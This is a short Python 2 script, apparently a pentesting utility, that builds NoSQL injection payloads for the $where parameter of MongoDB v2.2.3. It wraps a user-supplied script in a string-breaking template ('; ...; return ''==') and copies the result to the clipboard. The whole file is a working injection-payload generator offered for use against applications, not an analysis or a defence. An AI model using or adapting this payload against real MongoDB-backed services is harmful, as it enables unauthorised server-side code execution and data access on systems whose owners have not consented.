#!/bin/python
import sys
import pyperclip
from termcolor import colored
from termcolor import cprint


print("[*]Simple payload generator for MongoDB v2.2.3 injection into the $where parameter. \
        \n[*]Automatically copies it into your clipboard for you.")
#if(len(sys.argv) != 2):
#	print(colored("[*]","red")+"Usage: %s <payload>" %sys.argv[0])
 #       sys.exit(0)

payload=raw_input(colored("[*]","cyan")+"Enter the script to generate a payload for: ")

payloadFull="'; %s; return ''=='" % payload
print(colored("[+]","green")+"Payload generated and copied to the clipboard: %s" % payloadFull)
pyperclip.copy(payloadFull)

